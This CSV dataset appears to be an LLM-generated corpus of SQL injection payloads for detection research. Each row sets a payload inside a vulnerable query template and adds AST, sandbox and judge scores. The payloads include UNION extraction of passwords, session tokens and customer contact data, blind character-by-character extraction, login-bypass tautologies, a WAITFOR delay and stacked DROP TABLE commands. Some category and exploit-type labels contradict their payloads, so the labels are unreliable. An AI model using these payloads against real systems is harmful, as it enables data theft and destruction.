query_id,payload,full_query,llm_attack_category,template_context,label,mutation_count,codebert_score,ast_is_valid,ast_dialect,ast_node_set,sandbox_executed,sandbox_detection_mode,sandbox_exploit_type,judge_malicious_intent_preserved,judge_realistic_for_context,judge_non_trivial_mutation,judge_overall_quality_score,judge_reason
q00079,"' UNION SELECT u.name, u.email FROM users u JOIN addresses a ON u.id = a.user_id --","SELECT * FROM users WHERE id = ' UNION SELECT u.name, u.email FROM users u JOIN addresses a ON u.id = a.user_id --",union_based,user_lookup,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""TableAlias"", ""Join"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00080,' OR 1=1 UNION SELECT d.data FROM data_tables d WHERE 1=1 #,SELECT * FROM users WHERE id = ' OR 1=1 UNION SELECT d.data FROM data_tables d WHERE 1=1 #,union_based,user_lookup,1,0,0.0,True,mysql,"[""Union"", ""Column"", ""Or"", ""Identifier"", ""TableAlias"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00082,"' UNION SELECT SUBSTRING(username, 1, 5), password FROM admin --","SELECT * FROM users WHERE id = ' UNION SELECT SUBSTRING(username, 1, 5), password FROM admin --",union_based,user_lookup,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00083,"' OR ASCII(SUBSTRING(username, 1, 1))=85 UNION SELECT password FROM users WHERE id = 1--","SELECT * FROM users WHERE id = ' OR ASCII(SUBSTRING(username, 1, 1))=85 UNION SELECT password FROM users WHERE id = 1--",union_based,user_lookup,1,0,0.0,True,default,"[""Union"", ""Column"", ""Ascii"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00084,"-- (' OR 1=1 UNION SELECT username, CONCAT(password, '@example.com') FROM users --","SELECT * FROM users WHERE id = -- (' OR 1=1 UNION SELECT username, CONCAT(password, '@example.com') FROM users --",union_based,user_lookup,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00086,"' OR 1=1 UNION ALL SELECT NULL AS username, UNHEX(REPLACE(SHA2(password, 256), '-', '')) AS password FROM users --","SELECT * FROM users WHERE id = ' OR 1=1 UNION ALL SELECT NULL AS username, UNHEX(REPLACE(SHA2(password, 256), '-', '')) AS password FROM users --",union_based,user_lookup,1,0,0.0,True,default,"[""Unhex"", ""Column"", ""Or"", ""Union"", ""Identifier"", ""Where"", ""Null"", ""Select"", ""Table"", ""SHA2"", ""Star"", ""EQ"", ""From"", ""Replace"", ""Alias"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for user_lookup; mutation appears non-trivial based on content and notes.
q00089,"1' UNION SELECT user_id, session_token FROM sessions --","SELECT * FROM orders WHERE status = '1' UNION SELECT user_id, session_token FROM sessions --' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00090,"1) UNION SELECT CONCAT(login_name, ':', hash_password) FROM auth_log --","SELECT * FROM orders WHERE status = '1) UNION SELECT CONCAT(login_name, ':', hash_password) FROM auth_log --' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,snowflake,"[""Column"", ""Identifier"", ""Where"", ""Select"", ""Literal"", ""JSONPath"", ""Table"", ""Star"", ""JSONExtract"", ""EQ"", ""JSONPathKey"", ""From"", ""JSONPathRoot""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00091,(SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE')--,SELECT * FROM orders WHERE status = '(SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE')--' ORDER BY date DESC,union_based,order_filter,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Subquery"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Count""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00092,"' UNION SELECT email, phone FROM customers --","SELECT * FROM orders WHERE status = '' UNION SELECT email, phone FROM customers --' ORDER BY date DESC",union_based,order_filter,1,0,0.0,True,default,"[""Union"", ""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00093,' AND EXISTS(SELECT 1 FROM inventory WHERE product_id IN (SELECT product_id FROM orders WHERE customer_id = 'customer_id'))--,SELECT * FROM orders WHERE status = '' AND EXISTS(SELECT 1 FROM inventory WHERE product_id IN (SELECT product_id FROM orders WHERE customer_id = 'customer_id'))--' ORDER BY date DESC,union_based,order_filter,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""In"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for order_filter; mutation appears non-trivial based on content and notes.
q00095,' OR EXISTS(SELECT * FROM admin WHERE id = 1) --,"INSERT INTO comments (user_id, body) VALUES (1, '' OR EXISTS(SELECT * FROM admin WHERE id = 1) --')",union_based,comment_insert,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00097,"') UNION ALL SELECT name, address FROM customers WHERE account_status = 'active';#","INSERT INTO comments (user_id, body) VALUES (1, '') UNION ALL SELECT name, address FROM customers WHERE account_status = 'active';#')",union_based,comment_insert,1,0,0.0,True,mysql,"[""Union"", ""Column"", ""Paren"", ""Identifier"", ""Semicolon"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00098,-- AND (SELECT COUNT(*) FROM users WHERE role='admin')=#,"INSERT INTO comments (user_id, body) VALUES (1, '-- AND (SELECT COUNT(*) FROM users WHERE role='admin')=#')",union_based,comment_insert,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00099,'; DROP TABLE IF EXISTS sensitive_data; --,"INSERT INTO comments (user_id, body) VALUES (1, ''; DROP TABLE IF EXISTS sensitive_data; --')",union_based,comment_insert,1,0,0.0,True,default,"[""Column"", ""Semicolon"", ""Identifier"", ""Drop"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for comment_insert; mutation appears non-trivial based on content and notes.
q00104,'; DROP TABLE users --,SELECT * FROM users WHERE username = ''; DROP TABLE users --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Drop"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00105,1' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users') --,SELECT * FROM users WHERE username = '1' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users') --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00106,'' OR 1 IN (SELECT 1 FROM users WHERE username LIKE '%admin%') --,SELECT * FROM users WHERE username = ''' OR 1 IN (SELECT 1 FROM users WHERE username LIKE '%admin%') --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Column"", ""Or"", ""Identifier"", ""Where"", ""In"", ""Select"", ""Table"", ""Subquery"", ""Like"", ""From"", ""Literal""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00107,1' AND (SELECT 1 FROM users WHERE username LIKE '%admin%') --,SELECT * FROM users WHERE username = '1' AND (SELECT 1 FROM users WHERE username LIKE '%admin%') --' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Like"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00108,--\n1' AND ISNULL((SELECT TOP 1 username FROM users WHERE username LIKE '%admin%'--,SELECT * FROM users WHERE username = '--\n1' AND ISNULL((SELECT TOP 1 username FROM users WHERE username LIKE '%admin%'--' AND password = 'anything',blind_boolean,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00111,"[""-- AND 1=1 UNION ALL SELECT NULL,NULL,NULL,NOW()"", ""' OR 1<>(SELECT 1 FROM users WHERE username<>'admin'"", ""--); SELECT 1,2,3 AS""; ""'; WAITFOR DELAY '0:0:10' --"", ""' OR EXISTS(SELECT * FROM users WHERE SUBSTRING(username,1,1)<>'a'"")]","SELECT * FROM users WHERE username = '[""-- AND 1=1 UNION ALL SELECT NULL,NULL,NULL,NOW()"", ""' OR 1<>(SELECT 1 FROM users WHERE username<>'admin'"", ""--); SELECT 1,2,3 AS""; ""'; WAITFOR DELAY '0:0:10' --"", ""' OR EXISTS(SELECT * FROM users WHERE SUBSTRING(username,1,1)<>'a'"")]' AND password = 'anything'",blind_boolean,login,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""Select"", ""Table"", ""Star"", ""EQ"", ""From""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation appears non-trivial based on content and notes.
q00112,1' AND EXISTS(SELECT * FROM users WHERE username = 'admin') --,SELECT * FROM products WHERE name LIKE '%1' AND EXISTS(SELECT * FROM users WHERE username = 'admin') --%',blind_boolean,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Select"", ""Table"", ""Star"", ""Exists"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00113,"1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>53 --","SELECT * FROM products WHERE name LIKE '%1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1))>53 --%'",blind_boolean,search,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Identifier"", ""GT"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00114,' AND (SELECT 1 FROM users WHERE username = CHAR(97)) --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM users WHERE username = CHAR(97)) --%',blind_boolean,search,1,0,0.0,True,default,"[""Column"", ""Identifier"", ""Where"", ""And"", ""Chr"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00115,' AND (SELECT 1 FROM users WHERE 1=1 ORDER BY (CASE WHEN 1=1 THEN 1 ELSE 0 END) LIMIT 1 OFFSET 0) --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT 1 FROM users WHERE 1=1 ORDER BY (CASE WHEN 1=1 THEN 1 ELSE 0 END) LIMIT 1 OFFSET 0) --%',blind_boolean,search,1,0,0.0,True,default,"[""If"", ""Column"", ""Offset"", ""Paren"", ""Identifier"", ""Case"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""Order"", ""Limit"", ""EQ"", ""From"", ""Ordered"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00117,"' AND (1=1) UNION ALL (SELECT NULL, 2, 3, 4 FROM information_schema.tables) --","SELECT * FROM products WHERE name LIKE '%' AND (1=1) UNION ALL (SELECT NULL, 2, 3, 4 FROM information_schema.tables) --%'",blind_boolean,search,1,0,0.0,True,default,"[""Union"", ""Column"", ""Paren"", ""Identifier"", ""Where"", ""Null"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00118,"' AND (ASCII(SUBSTRING((SELECT email FROM users WHERE id=1), 1, 1)) > ASCII('b')) --","SELECT * FROM products WHERE name LIKE '%' AND (ASCII(SUBSTRING((SELECT email FROM users WHERE id=1), 1, 1)) > ASCII('b')) --%'",blind_boolean,search,1,0,0.0,True,default,"[""Column"", ""Ascii"", ""Paren"", ""Identifier"", ""GT"", ""Where"", ""And"", ""Select"", ""Subquery"", ""Table"", ""Star"", ""EQ"", ""From"", ""Literal"", ""Substring""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
q00120,--' OR '1'='1',SELECT * FROM products WHERE name LIKE '%--' OR '1'='1'%',blind_boolean,search,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation appears non-trivial based on content and notes.
